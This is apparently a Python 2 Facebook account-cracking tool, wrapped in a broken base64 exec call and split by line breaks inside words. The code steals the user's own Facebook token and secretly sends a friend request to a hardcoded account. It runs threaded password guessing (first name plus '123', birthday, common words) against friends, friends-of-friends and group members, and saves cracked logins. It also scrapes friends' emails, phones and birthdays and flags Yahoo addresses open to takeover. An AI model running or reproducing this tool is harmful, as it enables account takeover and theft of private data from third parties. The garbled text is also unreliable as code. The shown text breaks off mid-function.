import base64
exec(base64.base64decode('import os,sys,time,datetime,random,hashlib,re,threading,j
son,urllib,cookielib,requests,mechanize
from multiprocess
ing.pool import ThreadPool
from requests.exceptions impor
t ConnectionError
from mechanize import Browser


reload(
sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browse
r()
br.set_handle_robots(False)
br.set_handle_refresh(mec
hanize._http.HTTPRefreshProcessor(),max_time=1)
br.addhea
ders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/3
2.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


de
f keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys
.exit()
	
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
   
 for i in x:
        d += '!'+w[random.randint(0,len(w)-1
)]+i
    return cetak(d)
    
    
def cetak(x):
    w = 
'mhkbpcP'
    for i in w:
        j = w.index(i)
        
x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\0
33[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.w
rite(x+'\n')
	

def jalan(z):
	for e in z + '\n':
		sys.s
tdout.write(e)
		sys.stdout.flush()
		time.sleep(0.05)
		

logo = " \n\033[1;97m█████████\n\033[1
;97m█▄█████▄█      \033[1;96m●▬▬
▬▬▬▬▬▬๑🔱๑▬▬▬▬▬▬▬▬●
\n\033[1;97m█\033[1;91m▼▼▼▼▼ \033[1;97m- _ --
_--\033[1;92m╔╦╗┌─┐┬─┐┬┌─   ╔
╗╔╗ \n\033[1;97m█ \033[1;97m \033[1;97m_-_-- -_ 
--__\033[1;92m ║║├─┤├┬┘├┴┐───
╠╣ ╠╩╗\n\033[1;97m█\033[1;91m▲▲▲▲▲\
033[1;97m--  - _ --\033[1;92m═╩╝┴ ┴┴└─┴
 ┴   ╚  ╚═╝ \033[1;93mELITE v1.2\n\033[1;97m█
████████      \033[1;96m●▬▬▬▬
▬▬▬▬๑🔱๑▬▬▬▬▬▬▬▬●\n\033[
1;97m ██ ██\n\033[1;97m╔═══════
══════════════════
═════════════╗\n\033[1;97m
\033[1;93m* \033[1;97mAuthor  \033[1;91m: \033[1;96mDvs 
\033[1;97m                    ║\n\033[1;97m║\033[1;93
m* \033[1;97mGithub  \033[1;91m: \033[1;96mSedangDiBuat03
3[1;97m   ║\n\033[1;97m║\033[1;93m* \033[1;97mFB     
 \033[1;91m: \033[1;92m\033[4mhttps://fb.me/davidgantengh
ehe\033[0m   \033[1;97m║\n\033[1;97m║\033[1;93m* \033
[1;97mVersion \033[1;91m: \033[1;92m\033[4m1.2\033[0m    
                     \033[1;97m║\n\033[1;97m╚══
══════════════════
══════════════════
"  '\n\033[1;33m[✓] Silahkan Login Operamini Agar Tida
k Checkpoint\n'

def tik():
	titik = ['.   ','..  ','... 
']
	for o in titik:
		print("\r\033[1;96m[●] \x1b[1;93m
Sedang Login \x1b[1;97m"+o),;sys.stdout.flush();time.slee
p(1)


back = 0
threads = []
berhasil = []
cekpoint = []

oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln
"
vuln = "\033[32mVuln"

def siapa():
	os.system('clear')

	nama = raw_input("\033[1;97mInput Your Name! \033[1;91m
: \033[1;92m")
	if nama =="":
		print"\033[1;96m[!] \033[
1;91mIsi yang benar"
		time.sleep(1)
		siapa()
	else:
		o
s.system('clear')
		jalan("\033[1;97mSelamat Datang \033[
31;1m" +nama + "\n\033[1;97mMohon Gunakan Script Ini Deng
an Bijak!")
		time.sleep(2)
		loginSC()
		
		
def loginSC
():
	os.system('clear')
	print"\033[33;1m*Baca Sebelum Me
nggunakan!!\nSebelum Kalian Dapat Menggunakan Script Ini 
Maka \nKalian Harus Memasukan Username dan Password Terle
bih \nDahulu!,Jika Kalian Tidak Mempunyai/Mengetahui \nUs
ername dan Passwordnya, Silahkan Chat\nDahulu di Website 
Yang Barusan di Alihkan Otomatis.\n"
	os.system('xdg-open
 https://fb.me/davidgantenghehe')
        username = raw_
input("\033[1;96m[*] \033[1;97mUsername \033[1;91m: \033[
1;92m")
	password = raw_input("\033[1;96m[*] \033[1;97mPa
ssword \033[1;91m: \033[1;92m")
	if username =="dvs" and 
password =="ssb":
		print"\033[1;96m[✓] \033[1;92mLogin
 Success"
		time.sleep(1)
		login()
	else:
		print"\033[1
;96m[!] \033[1;91mSalah!!"
		os.system('xdg-open https://
fb.me/davidgantenghehe')
                time.sleep(1)
  
              LoginSC()

def login():
	os.system('clear')

	try:
		toket = open('login.txt','r')
		menu() 
	except 
(KeyError,IOError):
		os.system('clear')
		print logo
		p
rint 42*"\033[1;96m="
		print('\033[1;96m[☆] \x1b[1;93m
SILAHKAN LOGIN AKUN FACEBOOK ANDA \x1b[1;96m[☆]' )
		id
 = raw_input('\033[1;96m[+] \x1b[1;93mID/Email \x1b[1;91m
: \x1b[1;92m')
		pwd = raw_input('\033[1;96m[+] \x1b[1;93
mPassword \x1b[1;91m: \x1b[1;92m')
		tik()
		try:
			br.o
pen('https://free.facebook.com')
		except mechanize.URLEr
ror:
			print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi
"
			keluar()
		br._factory.is_html = True
		br.select_fo
rm(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd

		br.submit()
		url = br.geturl()
		if 'save-device' in u
rl:
			try:
				sig= 'api_key=882a8490361da98702bf97a021d
dc14dcredentials_type=passwordemail='+id+'format=JSONgene
rate_machine_id=1generate_session_cookies=1locale=en_USme
thod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.
062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":
"882a8490361da98702bf97a021ddc14d","credentials_type":"pa
ssword","email":id,"format":"JSON", "generate_machine_id"
:"1","generate_session_cookies":"1","locale":"en_US","met
hod":"auth.login","password":pwd,"return_ssl_resources":"
0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)

				a=x.hexdigest()
				data.update({'sig':a})
				url = 
"https://api.facebook.com/restserver.php"
				r=requests.
get(url,params=data)
				z=json.loads(r.text)
				unikers
 = open("login.txt", 'w')
				unikers.write(z['access_tok
en'])
				unikers.close()
				print '\n\033[1;96m[✓] \x
1b[1;92mLogin Succes'
				requests.post('https://graph.fa
cebook.com/me/friends?method=post&uids=gwimusa3&access_to
ken='+z['access_token'])
				os.system('xdg-open https://
www.facebook.com/davidgantenghehe')
				menu()
			except 
requests.exceptions.ConnectionError:
				print"\n\033[1;9
6m[!] \x1b[1;91mTidak Ada Koneksi"
				keluar()
		if 'che
ckpoint' in url:
			print("\n\033[1;96m[!] \x1b[1;91mSepe
rtinya Akun Anda Kena Checkpoint")
			os.system('xdg-open
 https://safeku.com/9Ov12vv1')
			time.sleep(1)
			keluar
()
		else:
			print("\n\033[1;96m[!] \x1b[1;91mPassword/E
mail salah")
			os.system('rm -rf login.txt')
			time.sle
ep(1)
			login()
			
			
def menu():
	os.system('clear')

	try:
		toket=open('login.txt','r').read()
	except IOErro
r:
		os.system('clear')
		print"\033[1;96m[!] \x1b[1;91mT
oken invalid"
		os.system('rm -rf login.txt')
		time.slee
p(1)
		keluar()
	try:
		otw = requests.get('https://graph
.facebook.com/me?access_token='+toket)
		a = json.loads(o
tw.text)
		nama = a['name']
		id = a['id']
	except KeyErr
or:
		os.system('clear')
		print"\033[1;96m[!] \033[1;91m
Token invalid"
		os.system('rm -rf login.txt')
		time.sle
ep(1)
		login()
	except requests.exceptions.ConnectionErr
or:
		print"\033[1;96m[!] \x1b[1;91mTidak Ada Koneksi"
		
keluar()
	os.system("clear")
	print logo
	print 42*"\033[
1;96m="
	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1
;93m Nama \033[1;91m: \033[1;92m"+nama+"\033[1;97m       
           "
	print "\033[1;96m[\033[1;97m✓\033[1;96m]\
033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m    
          "
	print 42*"\033[1;96m="
	print "\033[1;97m║
--\033[1;91m> \033[1;92m1.\033[1;97m Hack Facebook"
	prin
t "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Liha
t Daftar Grup"
        print "\033[1;97m║--\033[1;91m> 
\033[1;92m3.\033[1;97m Informasi Akun"
        print "\03
3[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Yahoo Clon
e"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;
97m Logout"
	pilih()


def pilih():
	unikers = raw_input(
"\033[1;97m╚═\033[1;91m>>> \033[1;97m")
	if unikers =
="":
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
		p
ilih()
	elif unikers =="1":
		super()
	elif unikers =="2"
:
		grupsaya()
	elif unikers =="3":
		informasi()
	elif u
nikers =="4":
		yahoo()
	elif unikers =="0":
		os.system(
'clear')
		jalan('Menghapus token')
		os.system('rm -rf l
ogin.txt')
		keluar()
	else:
		print "\033[1;96m[!] \x1b[
1;91mIsi yang benar"
		pilih()
		
		
def super():
	global
 toket
	os.system('clear')
	try:
		toket=open('login.txt'
,'r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[
1;91mToken invalid"
		os.system('rm -rf login.txt')
		tim
e.sleep(1)
		keluar()
	os.system('clear')
	print logo
	pr
int 42*"\033[1;96m="
	print "\033[1;97m║--\033[1;91m> \
033[1;92m1.\033[1;97m Crack Dari Daftar Teman"
	print "\0
33[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Crack Dar
i Teman Dari Teman"
        print "\033[1;97m║--\033[1;
91m> \033[1;92m3.\033[1;97m Crack Dari Teman Member Grup"

        print "\033[1;97m║--\033[1;91m> \033[1;92m4.\0
33[1;97m Crack Dari File"
	print "\033[1;97m║--\033[1;9
1m> \033[1;91m0.\033[1;97m Kembali"
	pilih_super()

def p
ilih_super():
	peak = raw_input("\033[1;97m╚═\033[1;9
1m>>> \033[1;97m")
	if peak =="":
		print "\033[1;96m[!] 
\x1b[1;91mIsi yang benar"
		pilih_super()
	elif peak =="1
":
		os.system('clear')
		print logo
		print 42*"\033[1;9
6m="
		jalan('\033[1;96m[✓] \033[32;1mMengambil ID \033
[1;97m...')
		r = requests.get("https://graph.facebook.co
m/me/friends?access_token="+toket)
		z = json.loads(r.tex
t)
		for s in z['data']:
			id.append(s['id'])
	elif peak
 =="2":
		os.system('clear')
		print logo
		print 42*"\03
3[1;96m="
		idt = raw_input("\033[1;96m[+] \033[32;1mMasu
kan ID teman \033[1;91m: \033[1;97m")
		try:
			jok = req
uests.get("https://graph.facebook.com/"+idt+"?access_toke
n="+toket)
			op = json.loads(jok.text)
			print"\033[1;9
6m[\033[1;97m✓\033[1;96m] \033[32;1mNama teman\033[1;91
m :\033[0;1m "+op["name"]
		except KeyError:
			print"\03
3[1;96m[!] \x1b[1;91mTeman tidak ditemukan!"
			raw_input
("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
			super()

		jalan('\033[1;96m[✓] \033[32;1mMengambil ID \033[1;97
m...')
		r = requests.get("https://graph.facebook.com/"+i
dt+"/friends?access_token="+toket)
		z = json.loads(r.tex
t)
		for i in z['data']:
			id.append(i['id'])
	elif peak
 =="3":
		os.system('clear')
		print logo
		print 42*"\03
3[1;96m="
		idg=raw_input('\033[1;96m[+] \033[1;93mMasuka
n ID group \033[1;91m:\033[1;97m ')
		try:
			r=requests.
get('https://graph.facebook.com/group/?id='+idg+'&access_
token='+toket)
			asw=json.loads(r.text)
			print"\033[1;
96m[\033[1;97m✓\033[1;96m] \033[1;93mNama group \033[1;
91m:\033[1;97m "+asw['name']
		except KeyError:
			print"
\033[1;96m[!] \x1b[1;91mGroup tidak ditemukan"
			raw_inp
ut("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
			super(
)
		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;
97m...')
		re=requests.get('https://graph.facebook.com/'+
idg+'/members?fields=name,id&limit=999999999&access_token
='+toket)
		s=json.loads(re.text)
		for p in s['data']:
	
		id.append(p['id'])
	elif peak =="4":
		os.system('clear
')
		print logo
		print 42*"\033[1;96m="
		try:
			idlist
 = raw_input('\x1b[1;96m[+] \x1b[1;93mMasukan nama file  
\x1b[1;91m: \x1b[1;97m')
			for line in open(idlist,'r').
readlines():
				id.append(line.strip())
		except IOError
:
			print '\x1b[1;96m[!] \x1b[1;91mFile tidak ditemukan'

			raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m
]')
			super()
	elif peak =="0":
		menu()
	else:
		print 
"\033[1;96m[!] \x1b[1;91mIsi yang benar"
		pilih_super()

	
	print "\033[1;96m[+] \033[32;1mTotal ID \033[1;91m: \0
33[0;1m"+str(len(id))
	titik = ['.   ','..  ','... ']
	fo
r o in titik:
		print("\r\033[1;96m[\033[1;97m✓\033[1;9
6m] \033[32;1mCrack \033[1;97m"+o),;sys.stdout.flush();ti
me.sleep(1)
	print
	print('\x1b[1;96m[!] \x1b[0;1mSabar O
m,Orang Sabar Di Sayang Janda')
	print 42*"\033[1;96m="
	

			
	def main(arg):
		global cekpoint,oks
		user = arg
	
	try:
			os.mkdir('out')
		except OSError:
			pass
		try:

			a = requests.get('https://graph.facebook.com/'+user+'
/?access_token='+toket)
			b = json.loads(a.text)
			pass
1 = b['first_name']+'123'
			data = urllib.urlopen("https
://b-api.facebook.com/method/auth.login?access_token=2377
59909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format
=json&sdk_version=2&email="+(user)+"&locale=en_US&passwor
d="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f55
5f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			
if 'access_token' in q:
				print '\x1b[33;1m[Cp+] \x1b[0
;1mID \x1b[1;91m      : \x1b[0;1m' + user
				print '\x1b
[33;1m[!] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass
1 + '\n'
				oks.append(user+pass1)
			else:
				if 'www.
facebook.com' in q["error_msg"]:
					print '\x1b[32;1m[O
K✓] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
			
		print '\x1b[32;1m[√] \x1b[0;1mPassword \x1b[1;91m: \x
1b[0;1m' + pass1 + '\n'
					cek = open("out/super_cp.txt
", "a")
					cek.write("ID:" +user+ " Pw:" +pass1+"\n")
	
				cek.close()
					cekpoint.append(user+pass1)
				else
:
					pass2 = b['first_name']+'12345'
					data = urllib
.urlopen("https://b-api.facebook.com/method/auth.login?ac
cess_token=237759909591655%25257C0f140aabedfb65ac27a739ed
1a2263b1&format=json&sdk_version=2&email="+(user)+"&local
e=en_US&password="+(pass2)+"&sdk=ios&generate_session_coo
kies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = js
on.load(data)
					if 'access_token' in q:
						print '\
x1b[33;1m[CP+] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' +
 user
						print '\x1b[33;1m[!] \x1b[0;1mPassword \x1b[1
;91m: \x1b[0;1m' + pass2 + '\n'
						oks.append(user+pas
s2)
					else:
						if 'www.facebook.com' in q["error_ms
g"]:
							print '\x1b[32;1m[OK✓] \x1b[0;1mID \x1b[1;9
1m      : \x1b[0;1m' + user
							print '\x1b[32;1m[√]
 \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass2 + '\n'

							cek = open("out/super_cp.txt", "a")
							cek.wri
te("ID:" +user+ " Pw:" +pass2+"\n")
							cek.close()
		
					cekpoint.append(user+pass2)
						else:
							pass3
 = b['last_name'] + '123'
							data = urllib.urlopen("h
ttps://b-api.facebook.com/method/auth.login?access_token=
237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&fo
rmat=json&sdk_version=2&email="+(user)+"&locale=en_US&pas
sword="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=
3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(d
ata)
							if 'access_token' in q:
								print '\x1b[3
3;1m[CP+] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user

								print '\x1b[33;1m[!] \x1b[0;1mPassword \x1b[1;91
m: \x1b[0;1m' + pass3 + '\n'
								oks.append(user+pass
3)
							else:
								if 'www.facebook.com' in q["error
_msg"]:
									print '\x1b[32;1m[OK✓] \x1b[0;1mID \x1
b[1;91m      : \x1b[0;1m' + user
									print '\x1b[32;
1m[√] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass3 
+ '\n'
									cek = open("out/super_cp.txt", "a")
					
				cek.write("ID:" +user+ " Pw:" +pass3+"\n")
									c
ek.close()
									cekpoint.append(user+pass3)
								e
lse:
									pass4 = 'sayang'
									data = urllib.url
open("https://b-api.facebook.com/method/auth.login?access
_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a22
63b1&format=json&sdk_version=2&email="+(user)+"&locale=en
_US&password="+(pass4)+"&sdk=ios&generate_session_cookies
=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = js
on.load(data)
									if 'access_token' in q:
										
print '\x1b[33;1m[cp+] \x1b[0;1mID \x1b[1;91m      : \x1b
[0;1m' + user
										print '\x1b[33;1m[➹] \x1b[0;1mP
assword \x1b[1;91m: \x1b[0;1m' + pass4 + '\n'
										o
ks.append(user+pass4)
									else:
										if 'www.fa
cebook.com' in q["error_msg"]:
											print '\x1b[32;
1m[OK✓] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user

											print '\x1b[32;1m[√] \x1b[0;1mPassword \x1b
[1;91m: \x1b[0;1m' + pass4 + '\n'
											cek = open("
out/super_cp.txt", "a")
											cek.write("ID:" +user+
 " Pw:" +pass4+"\n")
											cek.close()
											ce
kpoint.append(user+pass4)
										else:
											birt
hday = b['birthday']
											pass5 = birthday.replace(
'/', '')
											data = urllib.urlopen("https://b-api.
facebook.com/method/auth.login?access_token=2377599095916
55%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk
_version=2&email="+(user)+"&locale=en_US&password="+(pass
5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61f
cd7aa0c44f58f522ef6")
											q = json.load(data)
				
							if 'access_token' in q:
												print '\x1b[33
;1m[cp] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
	
											print '\x1b[33;1m[!] \x1b[0;1mPassword \x1b[1;
91m: \x1b[0;1m' + pass5 + '\n'
												oks.append(use
r+pass5)
											else:
												if 'www.facebook.co
m' in q["error_msg"]:
													print '\x1b[32;1m[OK
] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
						
							print '\x1b[32;1m[√] \x1b[0;1mPassword \x1b[1;91
m: \x1b[0;1m' + pass5 + '\n'
													cek = open("out
/super_cp.txt", "a")
													cek.write("ID:" +user+ 
" Pw:" +pass5+"\n")
													cek.close()
												
	cekpoint.append(user+pass5)
												else:
										
			pass6 = 'doraemon'
													data = urllib.urlopen(
"https://b-api.facebook.com/method/auth.login?access_toke
n=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&
format=json&sdk_version=2&email="+(user)+"&locale=en_US&p
assword="+(pass6)+"&sdk=ios&generate_session_cookies=1&si
g=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = jso
n.load(data)
													if 'access_token' in q:
							
							print '\x1b[33;1m[cp] \x1b[0;1mID \x1b[1;91m      
: \x1b[0;1m' + user
														print '\x1b[33;1m[!] \x
1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass6 + '\n'
			
											oks.append(user+pass6)
													else:
				
										if 'www.facebook.com' in q["error_msg"]:
						
									print '\x1b[32;1m[OK✓] \x1b[0;1mID \x1b[1;91m 
     : \x1b[0;1m' + user
															print '\x1b[32;1m
[√] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass6 + 
'\n'
															cek = open("out/super_cp.txt", "a")
	
														cek.write("ID:" +user+ " Pw:" +pass6+"\n")

															cek.close()
															cekpoint.append
(user+pass6)
		except:
			pass
		
	p = ThreadPool(30)
	p.
map(main, id)
	print '\033[1;96m[\033[1;97m✓\033[1;96m]
 \033[1;92mSelesai \033[1;97m....'
	print"\033[1;96m[+] \
033[33;1mTotal CP/\x1b[32;1mOK \033[1;91m: \033[1;92m"+st
r(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	p
rint("\033[1;96m[+] \033[1;92mCP File tersimpan \033[1;91
m: \033[1;97mout/super_cp.txt")
	raw_input("\n\033[1;96m[
\033[1;97mKembali\033[1;96m]")
	super()


def grupsaya():

	os.system('clear')
	try:
		toket=open('login.txt','r').
read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mT
oken invalid"
		os.system('rm -rf login.txt')
		time.slee
p(1)
		keluar()
	try:
		os.mkdir('out')
	except OSError:

		pass
	os.system('clear')
	print logo
	print 42*"\033[1;
96m="
	try:
		uh = requests.get('https://graph.facebook.c
om/me/groups?access_token='+toket)
		gud = json.loads(uh.
text)
		for p in gud['data']:
			nama = p["name"]
			id =
 p["id"]
			f=open('out/Grupid.txt','w')
			listgrup.appe
nd(id)
			f.write(id + '\n')
			print("\033[1;96m[✓] \0
33[1;92mGROUP SAYA")
			print("\033[1;96m[➹] \033[1;97m
ID  \033[1;91m: \033[1;92m"+str(id))
			print("\033[1;96m
[➹] \033[1;97mNama\033[1;91m: \033[1;92m"+str(nama) + '
\n')
		print 42*"\033[1;96m="
		print"\033[1;96m[+] \033[
1;92mTotal Group \033[1;91m:\033[1;97m %s"%(len(listgrup)
)
		print("\033[1;96m[+] \033[1;92mTersimpan \033[1;91m: 
\033[1;97mout/Grupid.txt")
		f.close()
		raw_input("\n\03
3[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()
	except (
KeyboardInterrupt,EOFError):
		print("\033[1;96m[!] \x1b[
1;91mTerhenti")
		raw_input("\n\033[1;96m[\033[1;97mKemba
li\033[1;96m]")
		menu()
	except KeyError:
		os.remove('o
ut/Grupid.txt')
		print('\033[1;96m[!] \x1b[1;91mGroup ti
dak ditemukan')
		raw_input("\n\033[1;96m[\033[1;97mKemba
li\033[1;96m]")
		menu()
	except requests.exceptions.Conn
ectionError:
		print"\033[1;96m[✖] \x1b[1;91mTidak ada 
koneksi"
		keluar()
	except IOError:
		print "\033[1;96m[
!] \x1b[1;91mError"
		raw_input("\n\033[1;96m[\033[1;97mK
embali\033[1;96m]")
		menu()

def informasi():
	os.system
('clear')
	try:
		toket=open('login.txt','r').read()
	exc
ept IOError:
		print"\033[1;91m[!] Token invalid"
		os.sy
stem('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.s
ystem('clear')
	print logo
	print 42*"\033[1;96m="
	aid =
 raw_input('\033[1;96m[+] \033[1;93mMasukan ID/Nama\033[1
;91m : \033[1;97m')
	jalan('\033[1;96m[✺] \033[1;93mTun
ggu sebentar \033[1;97m...')
	r = requests.get('https://g
raph.facebook.com/me/friends?access_token='+toket)
	cok =
 json.loads(r.text)
	for i in cok['data']:
		if aid in i[
'name'] or aid in i['id']:
			x = requests.get("https://g
raph.facebook.com/"+i['id']+"?access_token="+toket)
			z 
= json.loads(x.text)
			print 43*"\033[1;96m="
			try:
		
		print '\033[1;96m[➹] \033[1;93mNama\033[1;97m        
  : '+z['name']
			except KeyError: print '\033[1;96m[?] 
\033[1;93mNama\033[1;97m          : \033[1;91mTidak ada'

			try:
				print '\033[1;96m[➹] \033[1;93mID\033[1;97m
            : '+z['id']
			except KeyError: print '\033[1
;96m[?] \033[1;93mID\033[1;97m            : \033[1;91mTid
ak ada'
			try:
				print '\033[1;96m[➹] \033[1;93mEmai
l\033[1;97m         : '+z['email']
			except KeyError: pr
int '\033[1;96m[?] \033[1;93mEmail\033[1;97m         : \0
33[1;91mTidak ada'
			try:
				print '\033[1;96m[➹] \03
3[1;93mNo HP\033[1;97m         : '+z['mobile_phone']
			e
xcept KeyError: print '\033[1;96m[?] \033[1;93mNo HP\033[
1;97m         : \033[1;91mTidak ada'
			try:
				print '\
033[1;96m[➹] \033[1;93mTempat tinggal\033[1;97m: '+z['l
ocation']['name']
			except KeyError: print '\033[1;96m[?
] \033[1;93mTempat tinggal\033[1;97m: \033[1;91mTidak ada
'
			try:
				print '\033[1;96m[➹] \033[1;93mTanggal la
hir\033[1;97m : '+z['birthday']
			except KeyError: print
 '\033[1;96m[?] \033[1;93mTanggal lahir\033[1;97m : \033[
1;91mTidak ada'
			try:
				print '\033[1;96m[➹] \033[1
;93mSekolah\033[1;97m       : '
				for q in z['education
']:
					try:
						print '\033[1;91m                   ~
 \033[1;97m'+q['school']['name']
					except KeyError: pr
int '\033[1;91m                   ~ \033[1;91mTidak ada'

			except KeyError: pass
			raw_input("\n\033[1;96m[\033[
1;97mKembali\033[1;96m]")
			menu()
		else:
			pass
	else
:
		print"\033[1;96m[✖] \x1b[1;91mAkun tidak ditemukan"

		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")

		menu()

def yahoo():
	global toket
	os.system('clear')

	try:
		toket=open('login.txt','r').read()
	except IOErr
or:
		print"\033[1;91m[!] Token invalid"
		os.system('rm 
-rf login.txt')
		time.sleep(1)
		keluar()
	os.system('cl
ear')
	print logo
	print 42*"\033[1;96m="
	print "\033[1;
97m║--\033[1;91m> \033[1;92m1.\033[1;97m Crack Dari Daf
tar Teman"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2
.\033[1;97m Crack Dari Teman Dari Teman"
        print "\
033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Crack Da
ri Teman Member Grup"
        print "\033[1;97m║--\033[
1;91m> \033[1;92m4.\033[1;97m Crack Dari File"
	print "\0
33[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Kembali"

	clone()
       
def clone():
	embuh = raw_input("\033[1;
97m╚═\033[1;91m>>> \033[1;97m")
	if embuh =="":
		pri
nt "\033[1;96m[!] \x1b[1;91mIsi yang benar"
	elif embuh =
="1":
		clone_dari_daftar_teman()
	elif embuh =="2":
		cl
one_dari_teman()
	elif embuh =="3":
		clone_dari_member_g
roup()
	elif embuh =="4":
		clone_dari_file()
	elif embuh
 =="0":
		menu()
	else:
		print "\033[1;96m[!] \x1b[1;91m
Isi yang benar"
		

def clone_dari_daftar_teman():
	globa
l toket
	os.system('reset')
	try:
		toket=open('login.txt
','r').read()
	except IOError:
		print"\033[1;91m[!] Toke
n Invalid"
		os.system('rm -rf login.txt')
		time.sleep(1
)
		keluar()
	try:
		os.mkdir('out')
	except OSError:
		p
ass
	os.system('clear')
	print logo
	mpsh = []
	jml = 0
	
print 42*"\033[1;96m="
	jalan('\033[1;96m[\x1b[1;97m✺\x
1b[1;96m] \033[1;93mMengambil email \033[1;97m...')
	tema
n = requests.get('https://graph.facebook.com/me/friends?a
ccess_token='+toket)
	kimak = json.loads(teman.text)
	jal
an('\033[1;96m[\x1b[1;97m✺\x1b[1;96m] \033[1;93mStart \
033[1;97m...')
	print ('\x1b[1;96m[!] \x1b[1;93mStop CTRL
+z')
	print 42*"\033[1;96m="
	for w in kimak['data']:
		j
ml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name
']
		links = requests.get("https://graph.facebook.com/"+i
d+"?access_token="+toket)
		z = json.loads(links.text)
		
try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
	
		otw = yahoo.search(mail).group()
			if 'yahoo.com' in o
tw:
				br.open("https://login.yahoo.com/config/login?.sr
c=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")

				br._factory.is_html = True
				br.select_form(nr=0)

				br["username"] = mail
				klik = br.submit().read()
	
			jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.
*')
				try:
					pek = jok.search(klik).group()
				exce
pt:
					continue
				if '"messages.ERROR_INVALID_USERNAM
E">' in pek:
					print("\033[1;96m[✓] \033[1;92mVULN")

					print("\033[1;96m[➹] \033[1;97mID   \033[1;91m: \
033[1;92m"+id)
					print("\033[1;96m[➹] \033[1;97mEmai
l\033[1;91m: \033[1;92m"+mail)
					print("\033[1;96m[➹
] \033[1;97mNama \033[1;91m: \033[1;92m"+nama+ '\n')
				
	save = open('out/MailVuln.txt','a')
					save.write("Nam
a : "+ nama + '\n' "ID        : "+ id + '\n' "Email  : "+
 mail + '\n\n')
					save.close()
					berhasil.append(ma
il)
		except KeyError:
			pass
	print 42*"\033[1;96m="
	p
rint '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSeles
ai \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal \
033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;9
6m[+] \033[1;92mFile tersimpan \033[1;91m:\033[1;97m out/
MailVuln.txt"
	raw_input("\n\033[1;96m[\033[1;97mKembali\
033[1;96m]")
	menu()
		

def clone_dari_teman():
	global 
toket
	os.system('clear')
	try:
		toket=open('login.txt',
'r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1
;91mToken invalid"
		os.system('rm -rf login.txt')
		time
.sleep(1)
		keluar()
	try:
		os.mkdir('out')
	except OSEr
ror:
		pass
	os.system('clear')
	print logo
	mpsh = []
	j
ml = 0
	print 42*"\033[1;96m="
	idt = raw_input("\033[1;9
6m[+] \033[1;93mMasukan ID teman \033[1;91m: \033[1;97m")

	try:
		jok = requests.get("https://graph.facebook.com/"
+idt+"?access_token="+toket)
		op = json.loads(jok.text)

		print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNam
a\033[1;91m :\033[1;97m "+op["name"]
	except KeyError:
		
print"\033[1;96m[!] \x1b[1;91mTeman tidak ditemukan"
		ra
w_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		me
nu()
	jalan('\033[1;96m[✺] \033[1;93mMengambil email \0
33[1;97m...')
	teman = requests.get('https://graph.facebo
ok.com/'+idt+'/friends?access_token='+toket)
	kimak = jso
n.loads(teman.text)
	jalan('\033[1;96m[✺] \033[1;93mSta
rt \033[1;97m...')
